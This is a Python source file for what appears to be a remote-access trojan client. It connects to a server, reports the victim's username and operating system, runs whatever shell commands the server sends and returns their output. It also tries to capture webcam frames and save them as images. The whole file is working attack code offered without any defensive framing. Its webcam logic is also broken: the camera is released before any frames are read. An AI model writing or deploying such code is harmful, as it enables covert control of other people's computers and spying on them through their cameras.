from getpass import getuser 
from socket import *
import subprocess
import platform
import os
import cv2
# Libraries that will work with client system

# Receive the system specs
get_os = platform.uname()
get_user = getuser()
os_info = "client_name: " +str(get_user)+ "<--->" "client_OS: " +str(get_os)

# Server IP and port
ip = "127.0.0.1"
port = 1234
# Connection to server
connection = socket(AF_INET, SOCK_STREAM)
connection.connect((ip, port))
connection.send(os_info.encode())
# Directory to save the pictures
save_dir = 'C:/Users/HP/Desktop/pictures'
os.makedirs(save_dir, exist_ok=True)
# Initialize the webcam
cap = cv2.VideoCapture(0)

# Release the webcam
cap.release()
while True:
    try:
        receiver = connection.recv(1024).decode()
# For server commands
        if receiver == "exit":
            print("Server disconnected.")
            break
        elif receiver[:2] == "cd":
            try:
                os.chdir(receiver[3:])
                connection.send(os.getcwd().encode())
            except Exception as e:
                connection.send(f"Error changing directory{e}".encode())
        else:
            out_put = subprocess.getoutput(receiver)
            connection.send((out_put or "No output or command error").encode())
    except Exception as e:
        print(f"Error: {e}")
        break
    # Capture 3 frames
    for i in range(3):
        ret, frame = cap.read()
        if ret:
        # Save the frame as an image file
            cv2.imwrite(f'picture_{i+1}.png', frame)


connection.close()              